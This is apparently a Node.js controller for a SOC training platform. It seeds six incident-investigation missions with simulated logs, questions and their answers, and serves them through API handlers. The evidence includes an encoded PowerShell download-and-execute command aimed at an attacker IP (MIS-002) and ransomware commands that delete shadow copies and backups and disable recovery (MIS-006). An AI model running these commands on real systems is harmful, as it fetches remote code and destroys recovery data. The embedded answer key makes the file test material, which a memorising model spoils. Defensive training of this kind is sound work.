const Mission = require("../models/Mission");
const MissionProgress = require("../models/MissionProgress");
const User = require("../models/userModel");

// Default initial scenarios for realistic defensive cyber operations
const DEFAULT_MISSIONS = [
  {
    missionCode: "MIS-001",
    title: "Suspicious Sign-In Investigation",
    category: "Identity & Access",
    difficulty: "Beginner",
    estimatedDuration: "30 min",
    xpReward: 100,
    status: "published",
    featured: true,
    shortDescription: "A user reports unusual activity on their corporate account. Investigate authentication logs to determine the breach vector.",
    incidentBriefing: `### Incident Summary
At 08:42 UTC, SOC Tier 1 received an automated alert flagged by Entra ID Protection for user **sarah.connors@megacorp.local**.
The alert reported an **Impossible Travel** anomaly: a successful authentication from London, UK was immediately followed 6 minutes later by a successful logon from a suspicious ASN in St. Petersburg, Russia.

### Your Objectives
1. Inspect the authentication audit logs.
2. Identify the malicious IP address and User-Agent used by the adversary.
3. Determine if Multi-Factor Authentication (MFA) was bypassed or fatigue-prompted.
4. Locate the initial access token issued.`,
    mitreTechnique: "T1078 - Valid Accounts",
    evidenceArtifacts: [
      {
        name: "azure_ad_signin.json",
        artifactType: "Log",
        content: `[
  {
    "timestamp": "2026-10-22T08:36:12Z",
    "userPrincipalName": "sarah.connors@megacorp.local",
    "ipAddress": "82.165.197.1",
    "location": { "city": "London", "country": "GB" },
    "appDisplayName": "Office 365 Exchange Online",
    "clientAppUsed": "Browser",
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "mfaResult": "MFA_SATISFIED",
    "status": { "errorCode": 0 }
  },
  {
    "timestamp": "2026-10-22T08:42:05Z",
    "userPrincipalName": "sarah.connors@megacorp.local",
    "ipAddress": "194.26.29.112",
    "location": { "city": "St. Petersburg", "country": "RU" },
    "appDisplayName": "Microsoft Graph PowerShell",
    "clientAppUsed": "REST API",
    "userAgent": "python-requests/2.28.1",
    "mfaResult": "MFA_BYPASSED_SESSION_REUSE",
    "status": { "errorCode": 0 }
  }
]`,
      },
      {
        name: "threat_intel_notes.txt",
        artifactType: "Config",
        content: `ASN 44050 (Hostinger / CyberGhost VPN Exit node)
IP 194.26.29.112 observed in active AiTM (Adversary-in-the-Middle) phishing proxy infrastructure (Evilginx2).`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What is the rogue IP address used by the attacker to sign into Sarah's account?",
        hint: "Examine the second entry in azure_ad_signin.json from St. Petersburg.",
        answer: "194.26.29.112",
        xp: 30,
      },
      {
        taskNumber: 2,
        question: "What User-Agent header was recorded in the second authentication log?",
        hint: "Check the userAgent key in the suspicious log entry.",
        answer: "python-requests/2.28.1",
        xp: 30,
      },
      {
        taskNumber: 3,
        question: "What was the MFA result recorded in the anomalous login event?",
        hint: "Look at the mfaResult value.",
        answer: "MFA_BYPASSED_SESSION_REUSE",
        xp: 40,
      },
    ],
  },
  {
    missionCode: "MIS-002",
    title: "Something Executed",
    category: "Endpoint Detection",
    difficulty: "Intermediate",
    estimatedDuration: "45 min",
    xpReward: 150,
    status: "published",
    featured: true,
    shortDescription: "An endpoint has triggered a suspicious PowerShell alert. Determine what script was executed and trace the parent process.",
    incidentBriefing: `### Incident Summary
Our EDR sensor on workstation **FIN-WS09** triggered a high-severity alert: **Suspicious Encoded PowerShell Command Execution**.
The finance analyst reported their computer froze momentarily after downloading an invoice from an email attachment.

### Your Objectives
1. Inspect Sysmon Event ID 1 (Process Creation) logs.
2. Decode the Base64 PowerShell command payload.
3. Determine the parent process that spawned the shell.
4. Identify the C2 server IP the payload attempted to connect to.`,
    mitreTechnique: "T1059.001 - PowerShell",
    evidenceArtifacts: [
      {
        name: "sysmon_event_1.xml",
        artifactType: "Log",
        content: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-10-22T09:14:22.184Z"/>
    <Computer>FIN-WS09.megacorp.local</Computer>
  </System>
  <EventData>
    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE</Data>
    <Data Name="ParentProcessId">4108</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="ProcessId">5892</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADQANAAuADEAMgAuADkAOQA6ADgAMAA4ADAALwBiAGEAdAAuAHAAcwAxACcAKQA=</Data>
    <Data Name="User">MEGACORP\\finance_analyst</Data>
  </EventData>
</Event>`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What is the Parent Image executable that spawned PowerShell?",
        hint: "Look at the ParentImage tag value in the Sysmon event log.",
        answer: "EXCEL.EXE",
        xp: 50,
      },
      {
        taskNumber: 2,
        question: "What is the C2 URL extracted after decoding the -Enc Base64 PowerShell payload?",
        hint: "Base64 decode the UTF-16LE payload string from the CommandLine tag.",
        answer: "http://185.244.12.99:8080/bat.ps1",
        xp: 50,
      },
      {
        taskNumber: 3,
        question: "What is the process ID (PID) of the spawned powershell.exe process?",
        hint: "Look at the ProcessId tag.",
        answer: "5892",
        xp: 50,
      },
    ],
  },
  {
    missionCode: "MIS-003",
    title: "Phishing Campaign Triage",
    category: "Phishing Analysis",
    difficulty: "Beginner",
    estimatedDuration: "30 min",
    xpReward: 100,
    status: "published",
    featured: false,
    shortDescription: "Analyze a suspicious spear-phishing email, trace the sending infrastructure, and identify spoofed headers.",
    incidentBriefing: `### Incident Summary
A member of the HR department forwarded a suspicious email claiming to be from the IT Support Helpdesk regarding an urgent password expiration notice.
The analyst must parse the raw RFC 822 email headers and investigate the link destination.`,
    mitreTechnique: "T1566.002 - Spearphishing Link",
    evidenceArtifacts: [
      {
        name: "urgent_it_notice.eml",
        artifactType: "Email",
        content: `Delivered-To: hr-team@megacorp.local
Received: from mail-relay.phishguard.net (198.51.100.75)
Authentication-Results: spf=fail (sender IP is 198.51.100.75) smtp.mailfrom=support@megac0rp-portal.com;
From: "IT Support Desk" <helpdesk@megac0rp-portal.com>
Subject: URGENT: Mandatory Password Reset Required Within 2 Hours
Date: Thu, 22 Oct 2026 10:15:00 +0000

Attention Employee,
Your active directory password is set to expire in 2 hours.
Please access your authentication credentials here immediately:
https://login.microsoft.megac0rp-portal.com/auth/verify?session=99281`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What is the sender email domain used in the spoofed 'From' address?",
        hint: "Examine the domain right after the @ symbol in the From header.",
        answer: "megac0rp-portal.com",
        xp: 30,
      },
      {
        taskNumber: 2,
        question: "What is the originating IP address recorded in the Received header?",
        hint: "Look for the IP inside the parentheses in the Received header.",
        answer: "198.51.100.75",
        xp: 30,
      },
      {
        taskNumber: 3,
        question: "Did SPF authentication pass or fail?",
        hint: "Check the Authentication-Results header spf value.",
        answer: "fail",
        xp: 40,
      },
    ],
  },
  {
    missionCode: "MIS-004",
    title: "Lateral Movement Tracking",
    category: "Network Defense",
    difficulty: "Advanced",
    estimatedDuration: "60 min",
    xpReward: 200,
    status: "published",
    featured: false,
    shortDescription: "Investigate internal network telemetry to detect PsExec and SMB lateral movement across subnet segments.",
    incidentBriefing: `### Incident Summary
Network IDS sensors in the Engineering VLAN detected anomalous SMB traffic containing remote service creation commands.
Investigate the Windows Event Log 7045 (Service Created) and network flow telemetry to map the adversary's lateral traversal.`,
    mitreTechnique: "T1021.002 - SMB/Windows Admin Shares",
    evidenceArtifacts: [
      {
        name: "system_event_7045.log",
        artifactType: "Log",
        content: `EventID: 7045
ProviderName: Service Control Manager
ServiceName: PSEXESVC
ImagePath: %SystemRoot%\\PSEXESVC.exe
ServiceType: user mode service
StartType: demand start
AccountName: LocalSystem
TargetHost: SRV-DC01.megacorp.local
ClientIP: 10.0.4.15`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What was the name of the service installed during the remote invocation?",
        hint: "Check the ServiceName field in the event log.",
        answer: "PSEXESVC",
        xp: 60,
      },
      {
        taskNumber: 2,
        question: "What internal IP address initiated the remote service deployment?",
        hint: "Look at ClientIP in the log entry.",
        answer: "10.0.4.15",
        xp: 70,
      },
      {
        taskNumber: 3,
        question: "Under what account privilege did the service execute?",
        hint: "Check the AccountName property.",
        answer: "LocalSystem",
        xp: 70,
      },
    ],
  },
  {
    missionCode: "MIS-005",
    title: "Data Exfiltration Detection",
    category: "Network Defense",
    difficulty: "Advanced",
    estimatedDuration: "60 min",
    xpReward: 200,
    status: "published",
    featured: false,
    shortDescription: "Identify sensitive corporate data exfiltration through encrypted DNS tunneling and cloud storage APIs.",
    incidentBriefing: `### Incident Summary
An alert for high-volume anomalous DNS requests was triggered on the corporate internal recursive resolver.
Query lengths and entropy scores indicate base64-encoded subdomains being queried against an authoritative nameserver controlled by the adversary.`,
    mitreTechnique: "T1048.003 - Exfiltration Over Alternative Protocol",
    evidenceArtifacts: [
      {
        name: "dns_query_sample.log",
        artifactType: "Network",
        content: `10.0.2.89:54211 -> 10.0.0.1:53 | TXT IN c2VjcmV0X3Byb2plY3Rfc3BlY3NfcGFydDE=.tunnel.c2-exfil.org
10.0.2.89:54212 -> 10.0.0.1:53 | TXT IN Y3VzdG9tZXJfZGF0YWJhc2VfZHVtcF8yMDI2.tunnel.c2-exfil.org
10.0.2.89:54213 -> 10.0.0.1:53 | TXT IN YXBpX3NlY3JldF9rZXlzX3Byb2R1Y3Rpb24=.tunnel.c2-exfil.org`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What root domain is being used as the DNS tunneling sink?",
        hint: "Look at the domain suffix of the queries.",
        answer: "tunnel.c2-exfil.org",
        xp: 60,
      },
      {
        taskNumber: 2,
        question: "What is the internal IP address of the compromised client generating DNS tunnels?",
        hint: "Check the source IP in the query logs.",
        answer: "10.0.2.89",
        xp: 70,
      },
      {
        taskNumber: 3,
        question: "Decode the first exfiltrated subdomain payload (base64 string before .tunnel). What is the decoded file string?",
        hint: "Base64 decode 'c2VjcmV0X3Byb2plY3Rfc3BlY3NfcGFydDE='.",
        answer: "secret_project_specs_part1",
        xp: 70,
      },
    ],
  },
  {
    missionCode: "MIS-006",
    title: "Ransomware Incident Response",
    category: "Incident Response",
    difficulty: "Advanced",
    estimatedDuration: "75 min",
    xpReward: 250,
    status: "published",
    featured: true,
    shortDescription: "Investigate an active ransomware outbreak from initial credential access to volume shadow copy deletion and ransom note deployment.",
    incidentBriefing: `### Incident Summary
Files on the primary database share were renamed with the extension '.locked_lockbit'.
Simultaneously, shadow copies were deleted via vssadmin and a ransom note named 'README_RESTORE.txt' was dropped on desktop folders.`,
    mitreTechnique: "T1486 - Data Encrypted for Impact",
    evidenceArtifacts: [
      {
        name: "command_history.log",
        artifactType: "Command",
        content: `cmd.exe /c vssadmin.exe delete shadows /all /quiet
cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no
cmd.exe /c wbadmin delete catalog -quiet`,
      },
      {
        name: "README_RESTORE.txt",
        artifactType: "Other",
        content: `YOUR NETWORK HAS BEEN ENCRYPTED BY LOCKBIT 3.0
Decryption ID: LK-8891-B72A
Contact TOR portal: http://lockbit77xxxxxx.onion`,
      },
    ],
    tasks: [
      {
        taskNumber: 1,
        question: "What utility command was executed to delete all volume shadow copies?",
        hint: "Check the first line in command_history.log.",
        answer: "vssadmin.exe delete shadows /all /quiet",
        xp: 80,
      },
      {
        taskNumber: 2,
        question: "What is the Decryption ID mentioned in the ransom note?",
        hint: "Check README_RESTORE.txt.",
        answer: "LK-8891-B72A",
        xp: 80,
      },
      {
        taskNumber: 3,
        question: "What bcdedit option was disabled to prevent Windows recovery?",
        hint: "Look at the third command executed.",
        answer: "recoveryenabled no",
        xp: 90,
      },
    ],
  },
];

const MissionController = {
  // Public: Get all published missions with filters
  getAllPublishedMissions: async (req, res) => {
    try {
      const { category, difficulty, search } = req.query;
      const query = { status: "published" };

      if (category && category !== "All" && category !== "All Missions") {
        query.category = category;
      }
      if (difficulty && difficulty !== "All") {
        query.difficulty = difficulty;
      }
      if (search) {
        query.$or = [
          { title: { $regex: search, $options: "i" } },
          { missionCode: { $regex: search, $options: "i" } },
          { shortDescription: { $regex: search, $options: "i" } },
          { category: { $regex: search, $options: "i" } },
        ];
      }

      // Check if DB is empty; if so, seed default missions automatically
      const count = await Mission.countDocuments();
      if (count === 0) {
        await Mission.insertMany(DEFAULT_MISSIONS);
      }

      // Return missions with sanitized tasks (excluding answers)
      const missions = await Mission.find(query)
        .select("-tasks.answer")
        .sort({ missionCode: 1, createdAt: -1 });

      res.status(200).json(missions);
    } catch (err) {
      console.error("Error fetching published missions:", err);
      res.status(500).json({ msg: "Failed to retrieve missions catalog" });
    }
  },

  // Public: Get single mission by ID (Sanitizing answers for student view)
  getMissionById: async (req, res) => {
    try {
      const mission = await Mission.findById(req.params.id).select("-tasks.answer");
      if (!mission) {
        return res.status(404).json({ msg: "Mission scenario not found" });
      }
      res.status(200).json(mission);
    } catch (err) {
      console.error("Error fetching mission by ID:", err);
      res.status(500).json({ msg: "Failed to retrieve mission details" });
    }
  },

  // Student: Get mission progress for a specific user
  getUserMissionsProgress: async (req, res) => {
    try {
      const userId = req.query.userId || req.user?._id;
      if (!userId) {
        return res.status(200).json({});
      }

      const progressRecords = await MissionProgress.find({ userId });
      const progressMap = {};
      progressRecords.forEach((record) => {
        progressMap[record.missionId.toString()] = {
          status: record.status,
          progress: record.progress,
          completedTasks: record.completedTasks,
          earnedXp: record.earnedXp,
          completedAt: record.completedAt,
        };
      });

      res.status(200).json(progressMap);
    } catch (err) {
      console.error("Error fetching user missions progress:", err);
      res.status(500).json({ msg: "Failed to retrieve user mission progress" });
    }
  },

  // Student: Submit task answer & validate
  submitMissionTask: async (req, res) => {
    try {
      const { id } = req.params; // mission ID
      const { userId, taskNumber, answer } = req.body;

      if (!userId || taskNumber === undefined || !answer) {
        return res.status(400).json({ msg: "Missing userId, taskNumber, or answer." });
      }

      const mission = await Mission.findById(id);
      if (!mission) {
        return res.status(404).json({ msg: "Mission not found." });
      }

      const targetTask = mission.tasks.find((t) => t.taskNumber === Number(taskNumber));
      if (!targetTask) {
        return res.status(404).json({ msg: "Task not found in this mission." });
      }

      // Case-insensitive trimmed answer comparison
      const cleanGivenAnswer = answer.toString().trim().toLowerCase();
      const cleanCorrectAnswer = targetTask.answer.toString().trim().toLowerCase();

      if (cleanGivenAnswer !== cleanCorrectAnswer) {
        return res.status(200).json({
          isCorrect: false,
          msg: "Incorrect flag / answer. Re-examine the evidence artifact logs or review the hint.",
        });
      }

      // Correct answer! Update MissionProgress
      let progressRecord = await MissionProgress.findOne({ userId, missionId: id });
      if (!progressRecord) {
        progressRecord = new MissionProgress({
          userId,
          missionId: id,
          completedTasks: [],
          status: "in_progress",
        });
      }

      if (!progressRecord.completedTasks.includes(Number(taskNumber))) {
        progressRecord.completedTasks.push(Number(taskNumber));
      }

      const totalTasks = mission.tasks.length || 1;
      const progressPercentage = Math.round((progressRecord.completedTasks.length / totalTasks) * 100);
      progressRecord.progress = progressPercentage;

      const isCompleted = progressPercentage >= 100;
      if (isCompleted && progressRecord.status !== "completed") {
        progressRecord.status = "completed";
        progressRecord.completedAt = new Date();
        progressRecord.earnedXp = mission.xpReward;

        // Optionally increment user streak/xp if User model has streak/strike
        try {
          await User.findByIdAndUpdate(userId, {
            $inc: { streak: 1 },
          });
        } catch (uErr) {
          console.error("User update error:", uErr);
        }
      }

      await progressRecord.save();

      res.status(200).json({
        isCorrect: true,
        msg: "Objective verified! Correct answer.",
        progress: progressPercentage,
        completedTasks: progressRecord.completedTasks,
        isCompleted,
        earnedXp: isCompleted ? mission.xpReward : targetTask.xp,
      });
    } catch (err) {
      console.error("Error submitting task:", err);
      res.status(500).json({ msg: "Failed to validate mission task" });
    }
  },

  // Admin: Get all missions (including drafts and full answers)
  getAllMissionsAdmin: async (req, res) => {
    try {
      const missions = await Mission.find().sort({ createdAt: -1 });
      res.status(200).json(missions);
    } catch (err) {
      console.error("Error in getAllMissionsAdmin:", err);
      res.status(500).json({ msg: "Failed to retrieve missions for admin" });
    }
  },

  // Admin: Create mission
  createMission: async (req, res) => {
    try {
      const {
        missionCode,
        title,
        category,
        difficulty,
        estimatedDuration,
        xpReward,
        status,
        featured,
        shortDescription,
        incidentBriefing,
        mitreTechnique,
        evidenceArtifacts,
        tasks,
      } = req.body;

      if (!title || !shortDescription) {
        return res.status(400).json({ msg: "Title and short description are required." });
      }

      // Generate unique missionCode if not provided
      let finalCode = missionCode;
      if (!finalCode) {
        const count = await Mission.countDocuments();
        finalCode = `MIS-${String(count + 1).padStart(3, "0")}`;
      }

      const existing = await Mission.findOne({ missionCode: finalCode.toUpperCase() });
      if (existing) {
        return res.status(400).json({ msg: `Mission code ${finalCode} is already taken.` });
      }

      const newMission = await Mission.create({
        missionCode: finalCode.toUpperCase(),
        title,
        category: category || "Endpoint Security",
        difficulty: difficulty || "Intermediate",
        estimatedDuration: estimatedDuration || "45 min",
        xpReward: Number(xpReward) || 100,
        status: status || "published",
        featured: Boolean(featured),
        shortDescription,
        incidentBriefing: incidentBriefing || "",
        mitreTechnique: mitreTechnique || "",
        evidenceArtifacts: evidenceArtifacts || [],
        tasks: tasks || [],
      });

      res.status(201).json(newMission);
    } catch (err) {
      console.error("Error creating mission:", err);
      res.status(500).json({ msg: err.message || "Failed to create mission scenario" });
    }
  },

  // Admin: Update mission
  updateMission: async (req, res) => {
    try {
      const updatedMission = await Mission.findByIdAndUpdate(req.params.id, req.body, {
        new: true,
        runValidators: true,
      });
      if (!updatedMission) {
        return res.status(404).json({ msg: "Mission scenario not found" });
      }
      res.status(200).json(updatedMission);
    } catch (err) {
      console.error("Error updating mission:", err);
      res.status(500).json({ msg: err.message || "Failed to update mission" });
    }
  },

  // Admin: Delete mission
  deleteMission: async (req, res) => {
    try {
      const deleted = await Mission.findByIdAndDelete(req.params.id);
      if (!deleted) {
        return res.status(404).json({ msg: "Mission not found" });
      }
      // Also delete progress records for this mission
      await MissionProgress.deleteMany({ missionId: req.params.id });
      res.status(200).json({ msg: "Mission and associated student progress deleted successfully" });
    } catch (err) {
      console.error("Error deleting mission:", err);
      res.status(500).json({ msg: "Failed to delete mission" });
    }
  },

  // Admin: Seed or re-seed default missions
  seedMissions: async (req, res) => {
    try {
      await Mission.deleteMany({});
      const created = await Mission.insertMany(DEFAULT_MISSIONS);
      res.status(201).json({ msg: `Successfully seeded ${created.length} missions`, missions: created });
    } catch (err) {
      console.error("Error seeding missions:", err);
      res.status(500).json({ msg: "Failed to seed default missions" });
    }
  },
};

module.exports = MissionController;
